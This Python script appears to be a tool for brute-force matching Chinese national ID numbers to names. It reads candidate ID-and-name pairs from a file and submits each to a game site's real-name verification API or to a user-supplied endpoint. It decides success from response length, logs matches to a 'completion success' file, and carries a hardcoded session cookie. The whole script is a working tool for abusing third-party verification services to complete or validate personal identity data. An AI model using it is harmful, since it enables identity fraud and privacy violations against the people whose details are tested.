
import re
import requests
import time

url_announcement = "https://sharechain.qq.com/09a80ea2388ce890127e36ad8d69fb36"
header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
}
resp = requests.get(url_announcement, headers=header)
obj = re.compile('<span class="tit">(?P<ann_2>.*?)</span>', re.S)
announcement_2 = obj.finditer(str(resp.text))

def first():
    dit = input("请输入文件：")
    f = open(f"{dit}", "r")
    # cookie = input("请输入密钥：")
    for line in f.readlines(): 
        line = line.strip() 
        write = line[0:18]
        name = line[18:22]
        time.sleep(0.5)
        url = f"https://sdkh5.gamedog.cn/Integralapi/setIdCard/?callback=jQuery21408240026098465882_1684936199849&fullname={name}&idcard={write}&token=&bizId=1199021519&_=1684936199851"
        header ={
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
			'Cookie': '_ga=GA1.1.367111590.1684936173; Hm_lvt_15b67ce53ef6efd896a81316b10e56a4=1684936173; _ga_X2HQHR5L79=GS1.1.1684936172.1.1.1684936176.0.0.0; PHPSESSID=2pqoprsmmnbhlhcubf485ke22d; openchannel=1; Hm_lvt_65b7b1aecc0a0a7b7719bef5c6756c85=1684936178; __51uvsct__K45XKW8Tvw4JZC3A=1; __51vcke__K45XKW8Tvw4JZC3A=8e283324-2978-5504-b402-80a3c5ef2c26; __51vuft__K45XKW8Tvw4JZC3A=1684936177641; h5_accountregin=1; Gamedog_auth_info=f050eJSGSZQNKr2Vpnqq10EDbW%2BkRIlqvCLq1Ik73pb0TP4YrkKU3Qb%2F%2F%2BeZQPwh5GzMH5h2P9fTpnIhUewPCYFR92M; history_games=1731%2C1731; __vtins__K45XKW8Tvw4JZC3A=%7B%22sid%22%3A%20%22e25ab12e-a6e5-51df-8466-c6c92061e6be%22%2C%20%22vd%22%3A%203%2C%20%22stt%22%3A%2022339%2C%20%22dr%22%3A%2022308%2C%20%22expires%22%3A%201684937999969%2C%20%22ct%22%3A%201684936199969%7D; Hm_lpvt_65b7b1aecc0a0a7b7719bef5c6756c85=1684936200; Hm_lpvt_15b67ce53ef6efd896a81316b10e56a4=1684936200'
}
        resp = requests.post(url, headers=header)
        # print(resp.text)
        if len(resp.text) == 98:
        	print(name+write+"匹配失败")
        elif len(resp.text) == 97:
        	print(name+write+"匹配成功")
        	with open('柒.kill补齐成功.txt', 'a') as file:
        		print(name+write+"匹配成功")
        	break 
        else:
        	print(name+write+"接口和谐")
        	
def second():
    det = input('请输入文件：')
    # cookie = input("请输入密钥：")
    f = open(f"{det}", "r")
    url = input("请输入URL链接")
    for line in f.readlines():
        line = line.strip()
        write = line[0:18]
        name = line[18:22]
        time.sleep(0.3) 
        urls = url.split('realname=')[-1].				split('&idcard')[0]
        ursl = url.split('idcard=')[-1].split('&userconcat')[0]
        # print(urls)
        url_1 = url.replace(ursl, write).replace(urls, name)
        header ={
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36'
	}
        resp = requests.get(url_1,headers=header)
        print(resp.text)
        print(len(resp.text))
        if len(resp.text) >= 164 and len(resp.text)<= 167:
        	print(name+write+'匹配失败')
        elif len(resp.text) >= 537 and len(resp.text)<= 541:
        	print(write+name+'匹配成功')
        	with open('柒.kill补齐成功.txt', 'a') as file:
        		print(name+write+"匹配成功")
        	break 
        else:
        	print(name+write+'接口和谐')
for i in announcement_2:
   kit = i.group("ann_2")
   if len(kit) >= 20:
   	print(kit)
   	choose = input("请选择接口【1/2】：")
   	if choose == "1":
   		first()
   	elif choose == "2":
   		second()
   	else:
   		print("请选择接口【1/2】")
   else:
   	print('已更新版本，自行前往下载')